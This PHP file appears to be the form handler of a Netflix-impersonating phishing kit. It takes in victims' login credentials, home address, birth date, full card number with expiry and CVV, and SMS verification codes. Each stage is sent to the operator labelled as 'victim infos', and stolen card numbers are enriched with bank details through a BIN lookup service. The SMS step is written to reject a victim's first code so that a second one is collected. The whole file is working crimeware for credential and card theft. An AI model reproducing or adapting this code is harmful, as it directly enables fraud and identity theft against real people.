<?php


    require_once 'app/config.php';

    if($_SERVER['REQUEST_METHOD'] == "POST") {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if( $_POST['steeep'] == "login" ) {
            $_SESSION['errors'] = [];
            $_SESSION['username'] = $_POST['username'];
            $_SESSION['password'] = $_POST['password'];
            if( empty($_POST['username']) ) {
                $_SESSION['errors']['username'] = get_text('email_error');
            }
            if( empty($_POST['password']) || strlen($_POST['password']) < 4 ) {
                $_SESSION['errors']['password'] = get_text('password_error');
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | NETFLIX | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Email or Phone : ' . $_POST['username'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=verify";
                exit();
            } else {
                echo "../index.php?redirection=login&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "details" ) {
            $_SESSION['errors'] = [];
            $_SESSION['full_name']      = $_POST['full_name'];
            $_SESSION['address']      = $_POST['address'];
            $_SESSION['phone']      = $_POST['phone'];
            $_SESSION['city']          = $_POST['city'];
            $_SESSION['zip']          = $_POST['zip'];
            $_SESSION['birth_date']          = $_POST['birth_date'];
            if( validate_name($_POST['full_name']) == false ) {
                $_SESSION['errors']['full_name'] = get_text('full_name_error');
            }
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = get_text('address_error');
            }
            if( validate_number($_POST['phone']) == false ) {
                $_SESSION['errors']['phone'] = get_text('phone_error');
            }
            if( empty($_POST['city']) ) {
                $_SESSION['errors']['city'] = get_text('city_error');
            }
            if( empty($_POST['zip']) ) {
                $_SESSION['errors']['zip'] = get_text('zip_error');
            }
            if( empty($_POST['birth_date']) ) {
                $_SESSION['errors']['birth_date'] = get_text('birth_date_error');
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | NETFLIX | Details';
                $message = '/-- DETAILS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Full name : ' . $_POST['full_name'] . "\r\n";
                $message .= 'Address : ' . $_POST['address'] . "\r\n";
                $message .= 'Phone number : ' . $_POST['phone'] . "\r\n";
                $message .= 'City : ' . $_POST['city'] . "\r\n";
                $message .= 'Postal code : ' . $_POST['zip'] . "\r\n";
                $message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
                $message .= '/-- END DETAILS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=cc";
                exit();
            } else {
                echo "../index.php?redirection=details&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "cc" ) {
            $_SESSION['errors'] = [];
            $_SESSION['full_name']            = $_POST['full_name'];
            $_SESSION['phone']            = $_POST['phone'];
            $_SESSION['birth_date']            = $_POST['birth_date'];
            $_SESSION['one']            = $_POST['one'];
            $_SESSION['three']          = $_POST['three'];
            $_SESSION['two']            = $_POST['two'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( validate_name($_POST['full_name']) == false ) {
                $_SESSION['errors']['full_name'] = get_text('full_name_error');
            }
            if( validate_number($_POST['phone']) == false ) {
                $_SESSION['errors']['phone'] = get_text('phone_error');
            }
            if( empty($_POST['birth_date']) ) {
                $_SESSION['errors']['birth_date'] = get_text('birth_date_error');
            }
            if( $one == false ) {
                $_SESSION['errors']['one'] = get_text('one_error');
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = get_text('two_error');
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = get_text('three_error');
            }
            if( count($_SESSION['errors']) == 0 ) {
                $cc_without_space = str_replace(' ', '', $_POST['one']);
                $subject = get_client_ip() . ' | NETFLIX | Card';
                
                
                
                
                
                $bin = $_POST['one']; 
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;

$headers = array();
$headers[] = 'Accept-Version: 3';

$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);
$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['country'] = strtoupper($xBIN["country"]["name"]);
$bnk = $_SESSION['bank_name'];

                
                
                
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Full name : ' . $_POST['full_name'] . "\r\n";
                $message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
                $message .= 'Phone number : ' . $_POST['phone'] . "\r\n";
                $message .= 'Card Number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'CVV : ' . $_POST['three'] . "\r\n";
                $message .= ' [+]━━━━━━━【💳 Bin INFO━━━━━━━[+]';
                $message .= ' 
[🏛 Card Bank]          = '.$_SESSION['bank_name'].' 
[💳 Card type]          = '.$_SESSION['bank_type'].' 
[💳 Card brand]         = '.$_SESSION['bank_brand'].'
[💳 Card country]         = '.$_SESSION['country'].'
[+]━━━━━━━━━━━━━━━━【💻 Victim Infos】━━━━━━━━━━━━━━━━━[+]';
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=cc&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "sms" ) {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = get_text('sms_error');
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | NETFLIX | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    echo "../index.php?redirection=success";
                    exit();
                }
                $_SESSION['errors']['sms_code'] = get_text('sms_error');
                echo "../index.php?redirection=loading&error=1";
                exit();
            } else {
                $error = $_POST['error'];
                echo "../index.php?redirection=sms&error=$error";
                exit();
            }
        }

    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>